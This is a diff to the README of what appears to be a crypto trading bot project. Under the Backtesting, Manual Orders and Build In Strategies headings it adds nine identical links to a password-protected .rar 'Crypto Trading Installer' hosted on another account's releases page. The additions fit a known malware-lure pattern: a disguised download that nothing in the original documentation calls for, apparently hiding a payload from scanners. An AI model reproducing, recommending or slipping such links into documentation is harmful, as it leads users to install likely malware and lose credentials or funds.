@@ -204,17 +204,26 @@ webserver.ip: 127.0.0.1
 
 ![Webserver UI](documentation/trades.png 'Trades / Positions / Orders')
 
-### Backtesting
+### Backtesting  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 Currently there is a the UI for backtesting
 
 ![Webserver UI](documentation/backtest_result.png 'Backtest Result')
 
 ### Manual Orders
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 ![Webserver UI](documentation/manual_order.png 'Manual Orders')
 
 ## Build In Strategies
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
+**[Download Crypto Trading Installer](https://github.com/leroyobong/crypto-trading-bot/releases/download/CryptoTradingBotTradingView/Pswd_2024_CryptoTradingInstaller_LatestVersion2024.rar)**  
 
 Common strategy with indicators are inside, which most of the time are not profitable. See some more advanced strategy in the list below
 
